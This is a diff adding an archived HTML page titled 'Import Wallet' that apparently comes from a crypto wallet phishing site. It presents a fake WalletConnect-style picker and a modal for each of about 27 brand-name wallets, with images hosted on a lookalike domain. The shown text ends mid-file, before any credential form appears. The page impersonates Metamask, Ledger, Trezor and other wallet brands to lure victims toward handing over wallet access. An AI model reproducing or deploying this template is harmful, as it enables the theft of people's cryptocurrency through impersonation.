@@ -1,0 +1,628 @@
+<html data-scrapbook-source="https://signs-repo.com/access-walletconnect/" data-scrapbook-create="20230318185353583" data-scrapbook-title="Import Wallet" lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Import Wallet</title>
+    <link rel="shortcut icon" type="image/x-icon" href="urn:scrapbook:download:error:https://signs-repo.com/access-walletconnect/favicon.png">
+
+    <link rel="stylesheet" href="style.css">
+
+    <!-- google font -->
+    <link href="css2.css" rel="stylesheet">
+
+    <!-- bootstrap.css -->
+    <link href="bootstrap.min.css" rel="stylesheet">
+
+    <!-- bootstrap.js -->
+    
+
+    <style>
+        .modal-header {
+            justify-content: center;
+        }
+    </style>
+<style data-styled="active" data-styled-version="5.1.1">.bcMPWx { width: 45px; height: 45px; display: flex; border-radius: 50%; overflow: visible; box-shadow: none; -moz-box-pack: center; justify-content: center; -moz-box-align: center; align-items: center; }
+.bcMPWx img { width: 100%; height: 100%; }
+@media screen and (max-width: 768px) {
+  .bcMPWx { width: 8.5vw; height: 8.5vw; }
+}
+.hBmmHr { width: 100%; font-size: 24px; font-weight: 700; margin-top: 0.5em; color: rgb(12, 12, 13); }
+@media screen and (max-width: 768px) {
+  .hBmmHr { font-size: 5vw; }
+}
+.ceSpQQ { width: 100%; font-size: 18px; margin: 0.333em 0px; color: rgb(169, 169, 188); }
+@media screen and (max-width: 768px) {
+  .ceSpQQ { font-size: 4vw; }
+}
+.xPSun { transition: background-color 0.2s ease-in-out 0s; width: 100%; display: flex; flex-direction: column; -moz-box-pack: center; justify-content: center; -moz-box-align: center; align-items: center; background-color: rgb(255, 255, 255); border-radius: 12px; padding: 24px 16px; }
+@media screen and (max-width: 768px) {
+  .xPSun { padding: 1vw; }
+}
+.kaSVED { width: 100%; padding: 8px; display: flex; -moz-box-pack: center; justify-content: center; -moz-box-align: center; align-items: center; flex-direction: column; cursor: pointer; border-radius: 0px; border: 1px solid rgba(195, 195, 195, 0.14); }
+@media (hover: hover) {
+  .kaSVED:hover .sc-AxhCb { background-color: rgba(195, 195, 195, 0.14); }
+}
+.fdJEgN { transition: opacity 0.1s ease-in-out 0s; text-align: center; position: fixed; width: 100vw; height: 100vh; margin-left: -50vw; top: 0px; left: 50%; z-index: 2; will-change: opacity; background-color: rgba(0, 0, 0, 0.4); opacity: 0; visibility: hidden; pointer-events: none; display: flex; -moz-box-pack: center; justify-content: center; -moz-box-align: center; align-items: center; }
+.fdJEgN * { box-sizing: border-box !important; }
+.bRUsJg { position: relative; width: 100%; height: 100%; padding: 15px; display: flex; -moz-box-align: center; align-items: center; -moz-box-pack: center; justify-content: center; opacity: 0; visibility: hidden; pointer-events: none; }
+.hvJMgY { position: absolute; inset: 0px; }
+.DeUqc { position: relative; width: 100%; background-color: rgb(255, 255, 255); border-radius: 12px; margin: 10px; padding: 0px; opacity: 0; visibility: hidden; pointer-events: none; display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); max-width: 500px; min-width: fit-content; max-height: 100%; overflow: auto; }
+@media screen and (max-width: 768px) {
+  .DeUqc { max-width: 500px; grid-template-columns: 1fr; }
+}</style></head>
+
+<body style="background-color: #070E27; font-family: 'Poppins', sans-serif;">
+    <br>
+    <div style="color: antiquewhite; font-size: 18px; " align="center"><b>Connect your wallet</b></div>
+    <div class="main-body">
+        <div class="container">
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#trust">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">TrustWallet</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-trust-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#meta">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Metamask</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-meta-mask.svg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#coinbase">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Coinbase</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-coinbase.svg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#ledger">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Ledger</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-ledger.svg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#trezor">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Trezor</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-trezor.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#formatic">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Formatic</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-formatic.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#portis">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Portis</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-portis.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#tokenpocket">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Token Pocket</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-token-pocket.jpg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#cryptocom">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Crypto.com</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#coinmoni">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Coimoni Wallet</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-coinmoni-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#aave">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">AAVE Wallet</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-aave-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#monero">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Monero Wallet</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-monero-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#binance">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Binance Smart Wallet</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-binance-smart-chain.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#blockchain">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Blockchain</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/blockchain-logo.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#bitpay">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Bitpay</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/bitpay-1573dd6c95eb38386f181048663590d0.jpg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#digitex">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Digitex</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-digitx-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#atomic">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Atomic Wallet</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-atomic-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#enjin">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Enjin Wallet</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-enjin-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#eidoo">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Eidoo Wallet</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-eidoo-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#protocol">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Protocol</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-protocol.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#squarelink">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Squarelink</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-squarelink.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#torus">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Torus</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-torus.jpg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#ronin">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Ronin</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/ronin.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#solana">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Solana</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/solana.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#phantom">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Phantom</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/phantom.webp" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#auth">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Authereum</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-authereum.svg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#others">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Others</p>
+                <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/undraw_Confirmation_re_b6q5.png" alt="wallet_img">
+            </a>
+            <br>
+            <br>
+        </div>
+    </div>
+    <!--Trust Modal -->
+    <div class="modal fade" id="trust" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-trust-wallet.png" alt="wallet_img">
+                        Trustwallet
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Meta Modal -->
+    <div class="modal fade" id="meta" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-meta-mask.svg" alt="wallet_img">
+                        Metamask
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Coinbase Modal -->
+    <div class="modal fade" id="coinbase" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-coinbase.svg" alt="wallet_img">
+                        Coinbase
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Ledger Modal -->
+    <div class="modal fade" id="ledger" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-ledger.svg" alt="wallet_img">
+                        Ledger
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Trezor Modal -->
+    <div class="modal fade" id="trezor" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-trezor.png" alt="wallet_img">
+                        Trezor
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--FORMATIC Modal -->
+    <div class="modal fade" id="formatic" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-formatic.png" alt="wallet_img">
+                        Formatic
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--portis Modal -->
+    <div class="modal fade" id="portis" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-portis.png" alt="wallet_img">
+                        Portis
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Tokenpocket Modal -->
+    <div class="modal fade" id="tokenpocket" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-token-pocket.jpg" alt="wallet_img">
+                        Token Pocket
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Crypto.com Modal -->
+    <div class="modal fade" id="cryptocom" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="wallet_img">
+                        Crypto.com
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Coinmoni Modal -->
+    <div class="modal fade" id="coinmoni" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-coinmoni-wallet.png" alt="wallet_img">
+                        Coinmoni wallet
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--AAVE Modal -->
+    <div class="modal fade" id="aave" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-aave-wallet.png" alt="wallet_img">
+                        AAVE wallet
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Monero Modal -->
+    <div class="modal fade" id="monero" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-monero-wallet.png" alt="wallet_img">
+                        Monero wallet
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Binance Modal -->
+    <div class="modal fade" id="binance" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-binance-smart-chain.png" alt="wallet_img">
+                        Binance Smart wallet
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Blockchain Modal -->
+    <div class="modal fade" id="blockchain" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/blockchain-logo.png" alt="wallet_img">
+                        Blockchain
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Bitpay Modal -->
+    <div class="modal fade" id="bitpay" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/bitpay-1573dd6c95eb38386f181048663590d0.jpg" alt="wallet_img">
+                        Bitpay
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--digitex Modal -->
+    <div class="modal fade" id="digitex" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-digitx-wallet.png" alt="wallet_img">
+                        Diigtex
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <a href="https://signs-repo.com/access-walletconnect/T7cIAV40nnGq0aiN.html" class="btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Atomic Modal -->
+    <div class="modal fade" id="atomic" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-atomic-wallet.png" alt="wallet_img">
+                        Atomic
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Atomic Modal -->
+    <div class="modal fade" id="atomic" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-atomic-wallet.png" alt="wallet_img">
+                        Atomic
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Enjin Modal -->
+    <div class="modal fade" id="enjin" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-enjin-wallet.png" alt="wallet_img">
+                        Enjin Wallet
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Eidoo Modal -->
+    <div class="modal fade" id="eidoo" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-eidoo-wallet.png" alt="wallet_img">
+                        Eidoo Wallet
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Protocol Modal -->
+    <div class="modal fade" id="protocol" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-protocol.png" alt="wallet_img">
+                        Protocol Wallet
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Squarelink Modal -->
+    <div class="modal fade" id="squarelink" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-squarelink.png" alt="wallet_img">
+                        Squarelink
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Torus Modal -->
+    <div class="modal fade" id="torus" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-torus.jpg" alt="wallet_img">
+                        Torus
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
